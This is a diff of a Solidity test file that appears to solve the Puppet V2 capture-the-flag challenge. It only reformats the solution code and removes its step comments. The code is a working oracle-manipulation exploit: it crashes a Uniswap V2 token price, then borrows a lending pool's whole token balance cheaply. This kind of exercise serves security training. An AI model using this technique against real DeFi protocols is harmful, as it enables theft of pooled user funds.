@@ -97,36 +97,24 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-function test_puppetV2() public checkSolvedByPlayer {
-    /** STEP 1: Approve router and pool **/
-    token.approve(address(uniswapV2Router), type(uint256).max);
-    weth.approve(address(lendingPool), type(uint256).max);
+    function test_puppetV2() public checkSolvedByPlayer {
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        weth.approve(address(lendingPool), type(uint256).max);
 
-    /** STEP 2: Dump ALL player tokens into Uniswap (crash price) **/
-    address[] memory path = new address[](2);
-    path[0] = address(token);
-    path[1] = address(weth);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
 
-    uniswapV2Router.swapExactTokensForETH(
-        PLAYER_INITIAL_TOKEN_BALANCE,
-        0,
-        path,
-        player,
-        block.timestamp
-    );
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);
 
-    /** STEP 3: Wrap received ETH into WETH **/
-    uint256 ethBalance = player.balance;
-    weth.deposit{value: ethBalance}();
+        uint256 ethBalance = player.balance;
+        weth.deposit{value: ethBalance}();
 
-    /** STEP 4: Borrow all tokens from lending pool **/
-    uint256 poolTokens = token.balanceOf(address(lendingPool));
-    lendingPool.borrow(poolTokens);
+        uint256 poolTokens = token.balanceOf(address(lendingPool));
+        lendingPool.borrow(poolTokens);
 
-    /** STEP 5: Send tokens to recovery **/
-    token.transfer(recovery, poolTokens);
-}
-
+        token.transfer(recovery, poolTokens);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
